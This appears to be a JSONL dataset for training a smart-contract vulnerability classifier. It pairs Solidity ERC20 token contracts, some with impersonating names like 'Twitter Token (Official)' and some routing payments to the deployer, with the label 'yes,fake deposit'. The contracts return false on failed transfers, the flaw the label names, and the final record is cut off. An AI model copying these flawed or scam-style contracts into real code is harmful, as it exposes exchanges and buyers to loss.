{"prompt": "//SPDX-License-Identifier: MIT\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract TwitterOfficial is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000000000*10**uint256(decimals);\n string public constant name = \"Twitter Token (Official)\";\n string public constant symbol = \"TTKN\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Teenage_Mutant_Ninja_Turtles_Finance is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 2100000*10**uint256(decimals);\n string public constant name = \"Teenage Mutant Ninja Turtles Finance\";\n string public constant symbol = \"TMNT\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.4.11;\n\n\nlibrary SafeMath {\n function mul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n\n function div(uint a, uint b) internal returns (uint) {\n // assert(b > 0); // Solidity automatically throws when dividing by 0\n uint c = a / b;\n // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n return c;\n }\n\n function sub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n\n function add(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n\n function assert(bool assertion) internal {\n if (!assertion) {\n throw;\n }\n }\n}\n\n\ncontract ERC20Basic {\n uint public totalSupply;\n function balanceOf(address _owner) constant returns (uint balance);\n function transfer(address _to, uint _value) returns (bool success);\n function transferFrom(address _from, address _to, uint _value) returns (bool success);\n}\n \n \n \ncontract ERC20 is ERC20Basic {\n function approve(address _spender, uint _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint remaining);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract StandardToken is ERC20 {\n using SafeMath for uint;\n\n function transfer(address _to, uint _value) returns (bool) {\n \n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\n\ncontract Ownable {\n address public owner;\n\n\n \n function Ownable() {\n owner = msg.sender;\n }\n\n\n \n modifier onlyOwner() {\n if (msg.sender != owner) {\n throw;\n }\n _;\n }\n\n\n \n function transferOwnership(address newOwner) onlyOwner {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n\n}\n\n\n\ncontract BitcoinMoonToken is StandardToken, Ownable {\n\n uint8 public decimals = 18;\n uint public totalSupply = 50000000000 * 10 ** 18; \n string public name = \"Bitcoin Moon Token\";\n string public symbol = \"BMNT\";\n\n function BitcoinMoonToken() {\n balances[msg.sender] = totalSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: MIT\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\ncontract eBayToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"eBay Token (Official)\";\n string public constant symbol = \"EBAY\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Diamond_Shiba_Inu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Diamond Shiba Inu\";\n string public constant symbol = \"DINU\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.12;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract JuneteenthToken is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function JuneteenthToken(\n ) {\n balances[msg.sender] = 100000000000000 * 10**10;\n totalSupply = 100000000000000 * 10**10;\n name = \"Juneteenth Token\";\n decimals = 10;\n symbol = \"JUNETEENTH\";\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//Cryptoken\n//\u023b\n\npragma solidity ^0.4.11;\n\ncontract Token {\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n}\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Cryptoken is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n\n string public name = \"Cryptoken\"; \n uint8 public decimals = 22; \n string public symbol = \"CTN\";\n string public version = 'H1.0'; \n\n\n\n\n function Cryptoken(\n ) {\n balances[msg.sender] = 500000000000000000000000000000000; \n totalSupply = 500000000000000000000000000000000; \n name = \"Cryptoken\"; \n decimals = 22; \n symbol = \"CTN\"; \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract SkyDoge is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'SOGE1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function SkyDoge() {\n balances[msg.sender] = 10000000000000000000000000000; \n totalSupply = 10000000000000000000000000000;\n name = \"Sky Doge\";\n decimals = 18; \n symbol = \"SOGE\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract TokREI is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n\n function TokREI(\n ) {\n balances[msg.sender] = 1000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000; // Update total supply (100000 for example)\n name = \"TokREI\"; // Set the name for display purposes\n decimals = 5; // Amount of decimals for display purposes\n symbol = \"TREI\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract GoldenRetriever is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'GOLDEN1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function GoldenRetriever() {\n balances[msg.sender] = 100000000000000000000000000000; \n totalSupply = 100000000000000000000000000000;\n name = \"Golden Retriever\";\n decimals = 18; \n symbol = \"GOLDEN\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract WAKANDAINUTOKENETH is 